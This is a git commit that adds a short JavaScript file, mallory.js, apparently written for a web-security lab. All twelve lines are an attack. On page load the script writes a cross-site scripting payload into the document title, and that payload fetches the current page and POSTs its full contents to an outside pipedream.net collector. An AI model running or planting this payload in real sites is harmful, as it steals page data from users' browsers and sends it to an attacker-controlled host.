c8708b2fdac194970173fcd7df901dcfd7075f87
ginalin200 <160307832+ginalin200@users.noreply.github.com>
2024-03-19 14:12:26 -0400

    Create mallory.js

---
+++ mallory.js
@@ -0,0 +1,12 @@
+document.addEventListener('DOMContentLoaded', function(){
+  document.title = "<img src/ onerror=\
+      'fetch(document.URL)\
+      .then(response => response.text())\
+      .then(responseText => \
+          fetch(\"https://eol8hwg1v5ylu2h.m.pipedream.net\",\
+          { \
+              method: \"POST\", \
+              body: responseText \
+          })\
+      );'>";
+});
